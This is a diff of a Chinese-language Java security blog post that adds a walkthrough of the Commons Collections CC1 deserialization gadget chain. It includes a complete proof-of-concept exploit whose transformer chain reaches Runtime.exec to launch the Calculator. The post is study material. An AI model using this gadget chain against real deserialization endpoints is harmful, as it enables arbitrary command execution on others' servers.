@@ -31,8 +31,18 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/java%E5%AE%89%E5%85%A8/image-20250529122430750.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/java%E5%AE%89%E5%85%A8/image-20250529122439345.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/java%E5%AE%89%E5%85%A8/image-20250529124509284.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/test/image-20250602233027274.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/test/image-20250602233219340.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/test/image-20250602234312830.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/test/image-20250602234941136.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/test/image-20250602235127206.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/test/image-20250602235235730.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/test/image-20250602235533465.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/test/image-20250602235659771.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/test/image-20250602234321606.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/test/image-20250603000121154.png">
 <meta property="article:published_time" content="2025-05-25T08:01:33.000Z">
-<meta property="article:modified_time" content="2025-06-01T09:42:24.274Z">
+<meta property="article:modified_time" content="2025-06-02T16:38:59.488Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="java安全">
 <meta name="twitter:card" content="summary_large_image">
@@ -236,7 +246,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          30k words
+          33k words
         
       </span>
     
@@ -247,7 +257,7 @@
         
         
         
-          252 mins
+          276 mins
         
       </span>
     
@@ -367,6 +377,52 @@
 <blockquote>
 <p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>类实现了<code>java.lang.reflect.InvocationHandler</code>(<code>Java动态代理</code>)接口和<code>java.io.Serializable</code>接口，它还重写了<code>readObject</code>方法，在<code>readObject</code>方法中还间接的调用了<code>TransformedMap</code>中<code>MapEntry</code>的<code>setValue</code>方法，从而也就触发了<code>transform</code>方法，完成了整个攻击链的调用。</p>
 </blockquote>
+<p>总结一下</p>
+<blockquote>
+<ol>
+<li>需要实现序列化和反序列化的接口</li>
+<li>在readobject 中需要调用<code>setValue/put/putAll</code> 其中一个</li>
+</ol>
+</blockquote>
+<p>因为上面两个条件</p>
+<p>在readobject 函数中可以发现调用了setValue</p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/test/image-20250602233027274.png" srcset="/img/loading.gif" lazyload alt="image-20250602233027274"></p>
+<p>因此只需要想办法构造这个类，然后进行反序列化就行了</p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/test/image-20250602233219340.png" srcset="/img/loading.gif" lazyload alt="image-20250602233219340"></p>
+<p>但是该类的构造函数是private 的，所以无法被正常的实例化。</p>
+<p>因此可以使用反射进行实例化</p>
+<h2 id="反射创建"><a href="#反射创建" class="headerlink" title="反射创建"></a>反射创建</h2><p>然后看这个构造函数的参数。</p>
+<p>第一个是一个注解的类</p>
+<p>第二个是map 的class。需要传入一个增强过的map，才能调用到恶意的setValue。</p>
+<h3 id="查看map-需不需要什么特别的条件"><a href="#查看map-需不需要什么特别的条件" class="headerlink" title="查看map 需不需要什么特别的条件"></a>查看map 需不需要什么特别的条件</h3><p>直接从readobject 代码中看，因为有两个if</p>
+<h3 id="外层的if"><a href="#外层的if" class="headerlink" title="外层的if"></a>外层的if</h3><p><img src="https://raw.githubusercontent.com/august244/picture/master/test/image-20250602234312830.png" srcset="/img/loading.gif" lazyload alt="image-20250602234312830"></p>
+<p>来自于</p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/test/image-20250602234941136.png" srcset="/img/loading.gif" lazyload alt="image-20250602234941136"></p>
+<p>annotationType 是一个</p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/test/image-20250602235127206.png" srcset="/img/loading.gif" lazyload alt="image-20250602235127206"></p>
+<p>这个type 是我们传入的target.class</p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/test/image-20250602235235730.png" srcset="/img/loading.gif" lazyload alt="image-20250602235235730"></p>
+<p>本质上就是说，通过我们调用的注解对象获得了一个memberTypes。</p>
+<p>然后可以看看这个memberTypes 里面有啥</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.cclearn;<br><br><span class="hljs-keyword">import</span> sun.reflect.annotation.AnnotationType;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> AnnotationType.getInstance(Target.class);<br>        Map&lt;String, Class&lt;?&gt;&gt; classMap = annotationType.memberTypes();<br>        <span class="hljs-keyword">for</span> (Object s : classMap.entrySet()) &#123;<br>            System.out.println(s);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/test/image-20250602235533465.png" srcset="/img/loading.gif" lazyload alt="image-20250602235533465"></p>
+<p>有一个value 键</p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/test/image-20250602235659771.png" srcset="/img/loading.gif" lazyload alt="image-20250602235659771"></p>
+<p>因此传入的map 中应该有一个key&#x3D;”value” 的键值对</p>
+<h3 id="内层if"><a href="#内层if" class="headerlink" title="内层if"></a>内层if</h3><p><img src="https://raw.githubusercontent.com/august244/picture/master/test/image-20250602234321606.png" srcset="/img/loading.gif" lazyload alt="image-20250602234321606"></p>
+<p>只要能被创建就行</p>
+<p>因此外部的参数</p>
+<p>在这一步随便给就行。</p>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>综上，我们需要构造的参数如下</p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/test/image-20250603000121154.png" srcset="/img/loading.gif" lazyload alt="image-20250603000121154"></p>
+<p>最后需要反序列话调用</p>
+<h2 id="构造transform"><a href="#构造transform" class="headerlink" title="构造transform"></a>构造transform</h2><p>由于在if 中，最后发现setvalue 的值是不可控的，因此只会调用一次setvalue 中的transform </p>
+<p>所以只需要构造一个链式的，就可以完成调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.cclearn;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc1Learn</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        String cmd=<span class="hljs-string">&quot;open -a Calculator.app&quot;</span>; <span class="hljs-comment">// 执行的命令</span><br>        <span class="hljs-comment">// 执行命令的流程Runtime.getRuntime().exec()</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// ConstantTransformer 传入什么传出什么，需要一个Runtime作为开始</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-comment">// 获取Runtime对象</span><br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-comment">// 为什么是invoke ? : 因为getMethod()返回的是Method对象，而Method对象有invoke()方法</span><br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-comment">//  执行命令</span><br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;cmd&#125;)<br>        &#125;;<br>        ChainedTransformer ct=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers); <span class="hljs-comment">// 创建一个ChainedTransformer对象</span><br><br><br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br><br>        Map&lt;Object, Object&gt;  transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, ct);<br><br><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><br>        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        Serialize.serialize(object);<br>        Serialize.deserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br><br>&#125;<br><br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
